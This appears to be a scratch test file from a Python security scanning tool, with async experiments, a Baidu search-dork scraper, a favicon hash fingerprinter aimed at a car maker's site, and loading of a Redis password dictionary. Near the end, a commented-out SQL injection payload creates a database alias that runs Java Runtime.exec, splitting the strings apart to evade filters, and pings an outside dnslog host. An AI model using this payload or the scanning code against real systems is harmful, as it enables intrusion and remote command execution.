# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-08-25 1:14

import asyncio
import os
import random
import re
import time
import aiohttp
import hashlib
import codecs
import mmh3
# async def test(queue: asyncio.Queue):
#     while 1:
#         item = await queue.get()
#         await asyncio.sleep(1)
#         print(item)
#         queue.task_done()
#
#
# async def main():
#     queue = asyncio.Queue(-1)
#     for i in range(50):
#         await queue.put(i)
#
#     taskList = []
#     for i in range(10):
#         task = asyncio.create_task(test(queue))
#         taskList.append(task)
#
#     await queue.join()
#
#     for k in taskList:
#         k.cancel()
#
#     await asyncio.gather(*taskList, return_exceptions=True)
from urllib.parse import quote

import aiohttp
from aiohttp import ClientSession
from bs4 import BeautifulSoup

from core.utils.InformationProvider import InformationProvider


async def _baidu(search, page):
    async with ClientSession() as session:
        for n in range(0, page * 10, 10):
            base_url = 'https://www.baidu.com/s?wd=' + str(quote(search)) + '&oq=' + str(
                quote(search)) + '&ie=utf-8' + '&pn=' + str(n)
            async with session.get(url=base_url) as response:
                if response:
                    res = await response.text()
                    print(res)
                    soup = BeautifulSoup(res, "html.parser")
                    for a in soup.select('div.c-container > h3 > a'):
                        async with session.get(url=a['href']) as response:
                            if response:
                                url = str(response.url)
                                yield url


async def test02():
    async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
        await asyncio.sleep(10)

        await asyncio.sleep(5)

        return 1


def test01():
    try:
        a = 1 / 0
    except:
        return 1
    finally:
        print(22)


def test02():
    try:
        print(1 == 1)
    except:
        pass
    finally:
        print(2)
    return 3


async def test():
    async for url in _baidu("inurl:zjhu.edu.cn", 5):
        print(url)


def test0202():
    passwordDict = InformationProvider.readFile(os.path.join(InformationProvider.dictPath, 'redis_passwords.txt'))
    print(list(passwordDict))


def test0303():
    raise ConnectionResetError("aaaaaaaaaaaa")


class A(object):
    def __test(self):
        print('test')

    def test(self):
        self.__test()


def isIP(url):
    p = re.compile(r'^\d+.\d+.\d+:?[\d+]$')
    if p.match(url):
        return True
    else:
        return False


def getUrl(domain):
    if 'http://' in domain or 'https://' in domain:
        return f'{domain}'
    else:
        if ':443' in domain:
            return f'https://{domain}'

        if ':80' in domain:
            return f'http://{domain}'

        return f'http://{domain}'


async def getFaviconAndMD5():
    # try:
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Cache-Control': 'max-age=0',
        'DNT': '1',
        'Referer': 'https://www.google.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
                      '(KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36',
        'Upgrade-Insecure-Requests': '1',
        'X-Forwarded-For': '127.0.0.1',
    }
    async with aiohttp.ClientSession() as session:
        async with session.get('https://www.geely.com/favicon.ico', headers=headers, verify_ssl=False) as response:
            m1 = hashlib.md5()
            text = await response.read()
            m1.update(text)
            theMD5 = m1.hexdigest()
            print(theMD5)
            favicon = codecs.encode(text, 'base64')
            iconHash = mmh3.hash(favicon)
            iconMD5 = theMD5
            print('[+] get iconHash: ', iconHash)
            print('[+] get iconMD5: ', iconMD5)
            # else:
            #     raise Exception
    # except Exception as e:

    # print('[-] _getFaviconAndMD5 first failed, error is {}'.format(e.args))
    # print('[-] _getFaviconAndMD5 second ...')
    # try:
    #     async with aiohttp.ClientSession() as session:
    #         async with session.get(getUrl('www.geely.com') + '/favicon.ico', verify_ssl=False,
    #                                allow_redirects=False) as response:
    #             print(getUrl('proton.com') + '/favicon.ico')
    #             if response.status == 200:
    #                 m1_ = hashlib.md5()
    #                 m1_.update(response.read())
    #                 theMD5 = m1_.hexdigest()
    #                 favicon = codecs.encode(response.read(), 'base64')
    #                 print(favicon)
    #
    #                 iconHash = mmh3.hash(favicon)
    #                 iconMD5 = theMD5
    #                 print('[+] get iconHash: ', iconHash)
    #                 print('[+] get iconMD5: ', iconMD5)
    #             else:
    #                 raise Exception
    # except Exception as e:
    #     iconHash = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
    #     iconMD5 = 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
    #     print('[-] _getFaviconAndMD5 second failed, error is {}'.format(e.args))


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    loop.run_until_complete(getFaviconAndMD5())

    # vulList = [{'service': 'redis', 'ip': ['1.1.1.1:6379', '2.2.2.2:9874']}, {'service': 'rsync', 'ip': ['3.3.3.3:873','4.4.4.4:783']}]
    # for key, value in enumerate(vulList):
    #     print(key, value)
    # vulList.__delitem__(0)
    # print(vulList)
    # randomNum = random.randint(10000, 99999)
    #
    # formdata = "method=getupload&uploadID=1';CREATE ALIAS cs" + str(
    #     randomNum) + " AS CONCAT('void e(String cmd) throws " \
    #                  "java.io.IOException{','java.lan','g.Run','time rt=java.la','ng.Ru','ntime.getRu','ntime();rt.ex'," \
    #                  "'ec(cmd);}');CALL cs" + str(randomNum) + "('ping Leiloum.dnslog.cn');select+'1 "
    # print(formdata)
    # flag = isIP('1.1.1.1')
    # print(flag)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(test())
    # a = A()
    # print(os.path.abspath('.').join('/exploit/web/'))
    # start = time.time()
    # asyncio.run(test02())
    # print(time.time() - start)
